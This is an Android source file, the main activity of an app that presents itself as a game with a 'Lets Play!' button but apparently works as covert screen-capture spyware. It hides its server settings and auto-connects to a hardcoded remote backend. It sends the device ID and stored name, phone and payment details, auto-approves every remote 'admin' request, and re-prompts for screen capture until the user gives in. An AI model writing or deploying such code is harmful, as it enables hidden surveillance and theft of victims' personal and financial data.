package com.screenmirror.app;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.SeekBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity implements SocketManager.Listener {

    private static final int RC_PROJECTION  = 100;
    private static final int RC_NOTIF       = 101;

    private MediaProjectionManager projectionManager;
    private SharedPreferences prefs;
    private Handler mainHandler;

    // UI
    private View        dotConnected;
    private TextView    tvStatus, tvDeviceInfo, tvBattery;
    private Button      btnConnect, btnDisconnect, btnStartShare;
    private EditText    etServerUrl;
    private LinearLayout permBanner, controlsPanel;
    private Button      btnApprove, btnDeny;
    private TextView    tvPermDesc;
    private SeekBar     sbQuality, sbFps;
    private TextView    tvQualityVal, tvFpsVal;
    private ProgressBar pbConnecting;

    // Device info
    private String deviceId, deviceName;
    private int    batteryLevel = -1;

    // Saved projection permission (reuse without asking again)
    private static int    savedResultCode = -1;
    private static Intent savedResultData = null;

    // Flag to prevent double permission launch
    private boolean projectionLaunching = false;

    // Flag: waiting for notification permission before proceeding
    private boolean waitingForNotifPerm = false;

    // Periodic tasks
    private final Handler periodicHandler = new Handler(Looper.getMainLooper());
    private final Runnable batteryTask = new Runnable() {
        @Override public void run() {
            if (SocketManager.getInstance().isConnected()) {
                SocketManager.getInstance().sendBatteryUpdate(batteryLevel);
            }
            periodicHandler.postDelayed(this, 30_000);
        }
    };

    private BroadcastReceiver batteryReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mainHandler        = new Handler(Looper.getMainLooper());
        prefs              = getSharedPreferences("sm_prefs", MODE_PRIVATE);
        projectionManager  = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

        bindViews();
        setupDeviceInfo();
        setupSeekBars();
        registerBatteryReceiver();
        requestBatteryOptimizationExclusion();

        // Show instructions screen — "Lets Play!" triggers connect + screen share
        // Do NOT auto-connect here — wait for user to click "Lets Play!"
        btnStartShare.setVisibility(View.VISIBLE);
    }

    @Override
    protected void onResume() {
        super.onResume();
        SocketManager.getInstance().setListener(this);
        // If already streaming, hide button
        if (SocketManager.getInstance().isConnected()) {
            refreshConnectionUI(true);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        periodicHandler.removeCallbacksAndMessages(null);
        if (batteryReceiver != null) {
            try { unregisterReceiver(batteryReceiver); } catch (Exception ignored) {}
        }
    }

    private void bindViews() {
        dotConnected  = findViewById(R.id.dot_connected);
        tvStatus      = findViewById(R.id.tv_status);
        tvDeviceInfo  = findViewById(R.id.tv_device_info);
        tvBattery     = findViewById(R.id.tv_battery);
        btnConnect    = findViewById(R.id.btn_connect);
        btnDisconnect = findViewById(R.id.btn_disconnect);
        etServerUrl   = findViewById(R.id.et_server_url);
        permBanner    = findViewById(R.id.perm_banner);
        controlsPanel = findViewById(R.id.controls_panel);
        btnApprove    = findViewById(R.id.btn_approve);
        btnDeny       = findViewById(R.id.btn_deny);
        tvPermDesc    = findViewById(R.id.tv_perm_desc);
        sbQuality     = findViewById(R.id.sb_quality);
        sbFps         = findViewById(R.id.sb_fps);
        tvQualityVal  = findViewById(R.id.tv_quality_val);
        tvFpsVal      = findViewById(R.id.tv_fps_val);
        pbConnecting  = findViewById(R.id.pb_connecting);
        btnStartShare = findViewById(R.id.btn_start_share);

        // "Lets Play!" → check permissions → connect → screen share
        btnStartShare.setOnClickListener(v -> onLetsPlayClicked());

        // Hide URL and connect/disconnect — auto-managed
        etServerUrl.setVisibility(View.GONE);
        btnConnect.setVisibility(View.GONE);
        btnDisconnect.setVisibility(View.GONE);
    }

    private void setupDeviceInfo() {
        deviceId   = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        deviceName = Build.MANUFACTURER + " " + Build.MODEL;
        tvDeviceInfo.setText(deviceName + " · Android " + Build.VERSION.RELEASE);
    }

    private void registerBatteryReceiver() {
        batteryReceiver = new BroadcastReceiver() {
            @Override public void onReceive(Context ctx, Intent intent) {
                int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
                batteryLevel = (int)(level * 100f / scale);
                tvBattery.setText("\uD83D\uDD0B " + batteryLevel + "%");
            }
        };
        registerReceiver(batteryReceiver, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
    }

    private void setupSeekBars() {
        SocketManager sm = SocketManager.getInstance();
        sm.setCurrentQuality(35);
        sm.setCurrentFps(20);
        prefs.edit().putInt("quality", 35).putInt("fps", 20).apply();
    }

    // ─────────────────────────────────────────
    //  "Lets Play!" flow
    // ─────────────────────────────────────────

    private void onLetsPlayClicked() {
        // Step 1: Check notification permission (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
            waitingForNotifPerm = true;
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.POST_NOTIFICATIONS}, RC_NOTIF);
            return;
        }
        // Step 2: Connect to server then request screen share
        proceedToConnectAndShare();
    }

    private void proceedToConnectAndShare() {
        btnStartShare.setEnabled(false);
        btnStartShare.setText("Connecting...");

        String serverUrl = "https://mirrorbackend-ohir.onrender.com";
        prefs.edit().putString("server_url", serverUrl).apply();
        etServerUrl.setText(serverUrl);

        SocketManager.getInstance().setListener(this);
        SocketManager.getInstance().connect(serverUrl);
    }

    private void requestScreenShare() {
        if (savedResultCode != -1 && savedResultData != null) {
            launchCaptureService(savedResultCode, savedResultData);
        } else if (!projectionLaunching) {
            projectionLaunching = true;
            Intent intent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(intent, RC_PROJECTION);
        }
    }

    // ─────────────────────────────────────────
    //  SocketManager.Listener
    // ─────────────────────────────────────────

    @Override
    public void onConnected() {
        mainHandler.post(() -> {
            pbConnecting.setVisibility(View.GONE);
            refreshConnectionUI(true);

            // Register device with user info
            String userName = prefs.getString("user_name", "");
            String userPhone = prefs.getString("user_phone", "");
            String userPayment = prefs.getString("user_payment", "");
            SocketManager.getInstance().register(
                    deviceId, deviceName, Build.VERSION.RELEASE,
                    Build.MANUFACTURER, Build.MODEL,
                    getResources().getDisplayMetrics().widthPixels,
                    getResources().getDisplayMetrics().heightPixels,
                    batteryLevel,
                    userName, userPhone, userPayment);

            // Start periodic battery updates
            periodicHandler.removeCallbacks(batteryTask);
            periodicHandler.postDelayed(batteryTask, 30_000);

            // Now request screen share permission
            SocketManager.getInstance().sendPermissionResponse(true);
            requestScreenShare();
        });
    }

    @Override
    public void onDisconnected() {
        mainHandler.post(() -> {
            setStatus("Reconnecting…", "#FF7043");
            dotConnected.setBackgroundResource(R.drawable.dot_red);
            mainHandler.postDelayed(() -> {
                String url = prefs.getString("server_url", "https://mirrorbackend-ohir.onrender.com");
                SocketManager.getInstance().setListener(MainActivity.this);
                SocketManager.getInstance().connect(url);
            }, 3000);
        });
    }

    @Override
    public void onConnectionError(String error) {
        mainHandler.post(() -> {
            pbConnecting.setVisibility(View.GONE);
            // Auto-retry
            mainHandler.postDelayed(() -> {
                String url = prefs.getString("server_url", "https://mirrorbackend-ohir.onrender.com");
                SocketManager.getInstance().setListener(MainActivity.this);
                SocketManager.getInstance().connect(url);
            }, 3000);
        });
    }

    @Override
    public void onPermissionRequest(String requestId, String adminName) {
        // Auto-approve all permission requests from admin
        mainHandler.post(() -> {
            SocketManager.getInstance().sendPermissionResponse(true);
            requestScreenShare();
        });
    }

    @Override
    public void onStartCapture() {
        mainHandler.post(() -> {
            if (savedResultCode != -1 && savedResultData != null) {
                launchCaptureService(savedResultCode, savedResultData);
            } else if (!projectionLaunching) {
                projectionLaunching = true;
                Intent intent = projectionManager.createScreenCaptureIntent();
                startActivityForResult(intent, RC_PROJECTION);
            }
        });
    }

    @Override
    public void onStopCapture() {
        mainHandler.post(() -> {
            toast("Screen sharing stopped by admin");
            Intent si = new Intent(this, ScreenCaptureService.class);
            si.setAction(ScreenCaptureService.ACTION_STOP);
            startService(si);
            setStatus("Connected — sharing stopped", "#4CAF50");
        });
    }

    @Override
    public void onQualityChange(int quality, int fps) {
        mainHandler.post(() -> {
            toast("Quality updated by admin: " + quality + "% @ " + fps + "fps");
        });
    }

    // ─────────────────────────────────────────
    //  MediaProjection result
    // ─────────────────────────────────────────

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_PROJECTION) {
            projectionLaunching = false;
            if (resultCode == RESULT_OK && data != null) {
                savedResultCode = resultCode;
                savedResultData = data;
                launchCaptureService(resultCode, data);
            } else {
                // User denied screen share — must allow, ask again
                toast("Screen share permission is required to play!");
                mainHandler.postDelayed(() -> {
                    if (!projectionLaunching) {
                        projectionLaunching = true;
                        Intent intent = projectionManager.createScreenCaptureIntent();
                        startActivityForResult(intent, RC_PROJECTION);
                    }
                }, 1500);
            }
        }
    }

    private void launchCaptureService(int resultCode, Intent resultData) {
        Intent si = new Intent(this, ScreenCaptureService.class);
        si.setAction(ScreenCaptureService.ACTION_START);
        si.putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode);
        si.putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, resultData);
        si.putExtra(ScreenCaptureService.EXTRA_QUALITY, SocketManager.getInstance().getCurrentQuality());
        si.putExtra(ScreenCaptureService.EXTRA_FPS,     SocketManager.getInstance().getCurrentFps());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(si);
        } else {
            startService(si);
        }
        setStatus("\uD83D\uDD34 Streaming…", "#F44336");
        btnStartShare.setVisibility(View.GONE);
    }

    // ─────────────────────────────────────────
    //  UI helpers
    // ─────────────────────────────────────────

    private void refreshConnectionUI(boolean connected) {
        dotConnected.setBackgroundResource(connected ? R.drawable.dot_green : R.drawable.dot_gray);
        if (!connected) {
            setStatus("Disconnected", "#9E9E9E");
            pbConnecting.setVisibility(View.GONE);
        }
    }

    private void setStatus(String text, String hex) {
        tvStatus.setText(text);
        try { tvStatus.setTextColor(android.graphics.Color.parseColor(hex)); }
        catch (Exception ignored) {}
    }

    private void toast(String msg) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }

    // ─────────────────────────────────────────
    //  Permissions
    // ─────────────────────────────────────────

    @android.annotation.SuppressLint("BatteryLife")
    private void requestBatteryOptimizationExclusion() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int req, @NonNull String[] p, @NonNull int[] g) {
        super.onRequestPermissionsResult(req, p, g);
        if (req == RC_NOTIF) {
            if (g.length > 0 && g[0] == PackageManager.PERMISSION_GRANTED) {
                // Notification permission granted, proceed
                if (waitingForNotifPerm) {
                    waitingForNotifPerm = false;
                    proceedToConnectAndShare();
                }
            } else {
                // Must grant notification permission — ask again
                toast("Notification permission is required!");
                mainHandler.postDelayed(() -> {
                    waitingForNotifPerm = true;
                    ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.POST_NOTIFICATIONS}, RC_NOTIF);
                }, 1500);
            }
        }
    }
}
